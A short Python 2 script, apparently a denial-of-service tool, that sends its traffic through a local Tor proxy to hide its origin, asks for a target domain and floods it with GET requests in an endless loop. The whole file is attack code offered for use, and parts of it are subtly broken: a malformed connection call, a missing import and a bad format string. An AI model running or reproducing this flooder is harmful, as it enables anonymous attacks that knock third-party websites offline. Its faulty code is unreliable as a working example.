import socket
import socks
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, 'localhost', 9050, True)
socket.socket = socks.socksocket
print "entering tor entrence node"

import httplib
conn = httplib.HTTPConnection("my-ip.herokuapp.com")
conn.request("GET", "/")
response = conn.getresponse()
print "connected to tor nodes"
print 'connected to tor exit node'
print (response.read())
sent = 0

target = raw_input("[+] enter your target domain>>>> ")
target = ("http://"+target)
print (target)
ddos = httplib.HTTPConnection(target)
socket.settimeout(500)
while 1:
 ddos.request("GET", "/")
 sent = sent + 1
 sys.stdout.write("\r % get requests sent " % sent)